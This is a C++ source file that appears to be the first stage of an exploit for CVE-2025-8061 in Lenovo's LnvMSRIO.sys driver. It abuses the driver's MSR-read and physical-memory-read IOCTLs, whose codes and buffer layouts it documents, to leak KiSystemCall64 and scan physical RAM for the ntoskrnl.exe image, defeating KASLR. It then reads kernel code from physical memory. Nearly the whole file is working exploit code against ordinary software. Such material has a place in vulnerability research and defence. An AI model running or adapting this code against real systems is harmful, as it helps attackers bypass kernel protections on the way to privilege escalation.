/*
 * 01_kaslr_defeat.cpp  —  CVE-2025-8061 (Lenovo LnvMSRIO.sys) — KASLR Defeat
 *
 * Goal: recover ntoskrnl.exe load base (virtual address) from user-mode
 *       using only the driver's MSR-read and physical-memory-read primitives.
 *
 * Two-phase algorithm
 * ───────────────────
 * Phase 1 — LSTAR leak (MSR primitive)
 *   Read IA32_LSTAR (MSR 0xC0000082) → address of KiSystemCall64.
 *   This is a VA inside ntoskrnl.exe, so the kernel base is somewhere
 *   below it (backward scan target).
 *
 * Phase 2 — Physical RAM scan (physical-read primitive)
 *   Scan physical memory in 2 MB steps (ntoskrnl uses large pages → its
 *   physical base is always 2 MB-aligned).
 *   For each candidate page:
 *     a. Read first 4 KB via IOCTL.
 *     b. Check MZ signature, PE\0\0 signature, Machine == 0x8664.
 *     c. Read ImageBase from the PE optional header.
 *     d. Accept if KiSystemCall64 ∈ [ImageBase, ImageBase + SizeOfImage).
 *     e. Confirm by reading the export-directory Name RVA → "ntoskrnl.exe".
 *
 * IOCTL layouts (LnvMSRIO.sys)
 * ─────────────────────────────
 *   MSR read    0x9c402084
 *     IN  → { DWORD Register }                     (4 bytes)
 *     OUT ← { UINT64 Value }                        (8 bytes)
 *
 *   Phys read   0x9c406104
 *     IN  → { UINT64 PhysAddr; DWORD AccessSize; DWORD Count }  (16 bytes)
 *     OUT ← AccessSize × Count bytes
 *     AccessSize: 1 = BYTE, 2 = WORD, 8 = QWORD
 *     Driver calls MmMapIoSpace(PhysAddr, AccessSize*Count, ...) internally.
 *
 * Build (x64 Developer Command Prompt):
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:01_kaslr_defeat.exe 01_kaslr_defeat.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME      L"\\\\.\\WinMsrDev"
#define IOCTL_MSR_READ   0x9c402084u
#define IOCTL_PHYS_READ  0x9c406104u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── MSR read ─────────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct MsrReadIn  { DWORD Register; };
struct MsrReadOut { UINT64 Value;   };
#pragma pack(pop)

static bool ReadMSR(DWORD msr, uint64_t *out)
{
    MsrReadIn  in  = { msr };
    MsrReadOut res = {};
    DWORD      got = 0;

    if (!DeviceIoControl(g_dev, IOCTL_MSR_READ,
                         &in, sizeof(in), &res, sizeof(res), &got, nullptr)
        || got < sizeof(res)) {
        printf("[-] ReadMSR(0x%08X): error %lu\n", msr, GetLastError());
        return false;
    }
    *out = res.Value;
    return true;
}

// ─── Physical read ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn {
    UINT64 PhysAddr;    // physical address to map
    DWORD  AccessSize;  // element size: 1=BYTE, 2=WORD, 8=QWORD
    DWORD  Count;       // number of elements  →  total = AccessSize * Count bytes
};
#pragma pack(pop)

// Read `len` bytes (max 4096) from physical address `pa` into `buf`.
// Uses AccessSize=1 (byte) so any length works.
static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in  = { pa, 1, len };
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           buf,  len,
                           &got, nullptr) && (got == len);
}

// Convenience: read a single UINT64 from physical address `pa`.
static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in  = { pa, 8, 1 };   // 8-byte (QWORD) access
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           out,  sizeof(*out),
                           &got, nullptr) && (got == 8);
}

// ─── PE header helpers ────────────────────────────────────────────────────────
//
// All helpers operate on a raw 4 KB buffer `page` already read from physical
// memory.  Offsets follow the PE/COFF specification for 64-bit images.
//
//   [0x00]          IMAGE_DOS_HEADER.e_magic     "MZ"
//   [0x3C]          IMAGE_DOS_HEADER.e_lfanew    → offset of PE signature
//   [e_lfanew+0x00] PE signature                 0x00004550
//   [e_lfanew+0x04] COFF header (20 bytes)
//     +0x00  Machine          0x8664 = AMD64
//     +0x02  NumberOfSections
//     ...
//   [e_lfanew+0x18] Optional header (IMAGE_OPTIONAL_HEADER64):
//     +0x00  Magic            0x020B = PE32+
//     +0x18  ImageBase        UINT64   ← virtual load address we want
//     +0x38  SizeOfImage      DWORD
//     +0x70  DataDirectory[0] (Export): VirtualAddress DWORD + Size DWORD
//
// Absolute buffer offsets:
//   ImageBase   = e_lfanew + 0x18 (opt hdr start) + 0x18 = e_lfanew + 0x30
//   SizeOfImage = e_lfanew + 0x18                 + 0x38 = e_lfanew + 0x50
//   ExportDirRVA= e_lfanew + 0x18                 + 0x70 = e_lfanew + 0x88

static bool IsValidPE64(const uint8_t *p, size_t sz)
{
    if (sz < 0x100)                          return false;
    if (p[0] != 'M' || p[1] != 'Z')         return false;   // MZ

    LONG lfanew = *(const LONG *)(p + 0x3C);
    if (lfanew < 0 || (size_t)lfanew + 0x100 > sz) return false;

    if (*(const DWORD *)(p + lfanew) != 0x00004550u) return false; // PE\0\0
    if (*(const WORD  *)(p + lfanew + 4) != 0x8664)  return false; // AMD64
    if (*(const WORD  *)(p + lfanew + 0x18) != 0x020B) return false; // PE32+
    return true;
}

static uint64_t PE64_ImageBase(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint64_t *)(p + lfanew + 0x30);
}

static uint32_t PE64_SizeOfImage(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x50);
}

static uint32_t PE64_ExportDirRVA(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x88);
}

// ─── Physical RAM upper bound ─────────────────────────────────────────────────

static uint64_t PhysRamTop()
{
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    // Add 512 MB headroom and round up to 2 MB
    uint64_t top = ms.ullTotalPhys + (512ULL << 20);
    return (top + 0x1FFFFULL) & ~0x1FFFFFULL;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 01 - KASLR Defeat ===\n\n");

    if (!OpenDevice()) return 1;

    // ── Phase 1: read LSTAR → KiSystemCall64 ─────────────────────────────────
    //
    // IA32_LSTAR (0xC0000082) holds the kernel-mode entry point for SYSCALL
    // instructions on x64.  Windows stores KiSystemCall64 there.
    // This gives us a VA that is definitely inside ntoskrnl.exe.

    uint64_t lstar = 0;
    if (!ReadMSR(0xC0000082, &lstar) || !lstar) {
        printf("[-] Failed to read LSTAR\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] LSTAR (KiSystemCall64) = 0x%016llX\n\n", lstar);

    // Quick sanity: KiSystemCall64 must be in kernel VA space (> 0xFFFF000000000000)
    if (lstar < 0xFFFF000000000000ULL) {
        printf("[-] LSTAR value looks wrong (user-space VA?)\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Phase 2: physical RAM scan for ntoskrnl.exe PE header ────────────────
    //
    // ntoskrnl.exe is mapped with large pages (2 MB = 0x200000).
    // Consequence: its physical base is always 2 MB-aligned.
    // We scan in 2 MB steps: for each candidate, read the first 4 KB and
    // check for a valid 64-bit PE whose VA range contains KiSystemCall64.

    uint64_t ram_top = PhysRamTop();
    printf("[*] Scanning physical RAM  0x100000 .. 0x%llX  (%.0f MB, step=2MB)\n",
           ram_top, (double)ram_top / (1ULL << 20));

    uint8_t  page[4096];
    uint64_t found_pa   = 0;
    uint64_t found_base = 0;   // ntoskrnl.exe ImageBase (VA)
    uint32_t found_size = 0;   // SizeOfImage

    for (uint64_t pa = 0x100000ULL; pa < ram_top; pa += 0x200000ULL) {

        // Skip the PCI/MMIO hole — not RAM on any x64 system
        if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;

        // Read the first 4 KB of this 2 MB physical page
        if (!PhysRead(pa, page, sizeof(page))) continue;

        // Quick MZ check before full validation (avoids unnecessary work)
        if (page[0] != 'M' || page[1] != 'Z') continue;

        if (!IsValidPE64(page, sizeof(page))) continue;

        uint64_t img_base = PE64_ImageBase(page);
        uint32_t img_size = PE64_SizeOfImage(page);

        // Must be a kernel-space VA (Windows kernel: 0xFFFF800000000000+)
        if (img_base < 0xFFFF800000000000ULL) continue;

        // The VA range must contain KiSystemCall64
        if (lstar < img_base || lstar >= (uint64_t)img_base + img_size) continue;

        // ── Confirmed hit — now verify it is ntoskrnl via export directory ──
        //
        // IMAGE_EXPORT_DIRECTORY.Name (DWORD RVA at offset 0x0C) points to
        // the module name string (e.g., "ntoskrnl.exe").
        // We read this from physical memory using: PA + ExportDirRVA + 0x0C

        uint32_t exp_rva = PE64_ExportDirRVA(page);
        char     mod_name[32] = "<unknown>";

        if (exp_rva && exp_rva + 0x20 < img_size) {
            // Read IMAGE_EXPORT_DIRECTORY (first 20 bytes is enough for Name RVA)
            uint8_t expdir[20] = {};
            if (PhysRead(pa + exp_rva, expdir, sizeof(expdir))) {
                uint32_t name_rva = *(uint32_t *)(expdir + 0x0C);
                if (name_rva && name_rva + sizeof(mod_name) < img_size)
                    PhysRead(pa + name_rva, mod_name, sizeof(mod_name) - 1);
            }
        }

        printf("[+] PE64 @ PA=0x%016llX  ImageBase=0x%016llX  Size=0x%X  \"%s\"\n",
               pa, img_base, img_size, mod_name);

        // Accept ntoskrnl.exe / ntkrnlmp.exe / ntkrpamp.exe
        if (_stricmp(mod_name, "ntoskrnl.exe") == 0 ||
            _stricmp(mod_name, "ntkrnlmp.exe") == 0 ||
            _stricmp(mod_name, "ntkrpamp.exe") == 0) {
            found_pa   = pa;
            found_base = img_base;
            found_size = img_size;
            break;
        }

        // Export name mismatch but LSTAR hit — save as fallback, keep scanning
        if (!found_base) {
            found_pa   = pa;
            found_base = img_base;
            found_size = img_size;
            printf("    [~] Kept as fallback (no export name match yet)\n");
        }
    }

    // ── Results ───────────────────────────────────────────────────────────────

    if (!found_base) {
        printf("\n[-] ntoskrnl.exe NOT found in physical RAM.\n");
        printf("    Hint: large-page alignment assumption may have failed.\n");
        printf("    Try: NtQuerySystemInformation(SystemModuleInformation)\n");
        CloseHandle(g_dev); return 1;
    }

    uint64_t lstar_offset = lstar - found_base;

    printf("\n");
    printf("════════════════════════════════════════\n");
    printf(" ntoskrnl  VA base   : 0x%016llX\n", found_base);
    printf(" ntoskrnl  PA base   : 0x%016llX\n", found_pa);
    printf(" SizeOfImage         : 0x%08X  (%u MB)\n",
           found_size, found_size >> 20);
    printf(" KiSystemCall64  VA  : 0x%016llX\n", lstar);
    printf(" KiSystemCall64 +off : +0x%llX  (offset inside ntoskrnl)\n",
           lstar_offset);
    printf("════════════════════════════════════════\n");

    // ── Optional: pattern-scan for KiSystemCall64 within its own page ────────
    //
    // Demonstrates reading an arbitrary kernel page via physical address.
    // Reads the physical page that contains KiSystemCall64 and prints
    // the first 16 bytes (the function prologue).

    printf("\n[*] Reading KiSystemCall64 prologue from physical memory...\n");

    // Physical address of KiSystemCall64 = PA_of_ntoskrnl_base + RVA_of_KiSystemCall64
    //   = found_pa + lstar_offset
    // (valid because the entire image maps linearly from found_pa)
    uint64_t ki_pa = found_pa + lstar_offset;

    uint8_t prologue[16] = {};
    if (PhysRead(ki_pa, prologue, sizeof(prologue))) {
        printf("[+] KiSystemCall64 @ PA 0x%016llX :\n    ", ki_pa);
        for (int i = 0; i < 16; i++) printf("%02X ", prologue[i]);
        printf("\n");
    } else {
        printf("[-] Could not read KiSystemCall64 page\n");
    }

    CloseHandle(g_dev);
    printf("\n[+] Done.\n");
    return 0;
}
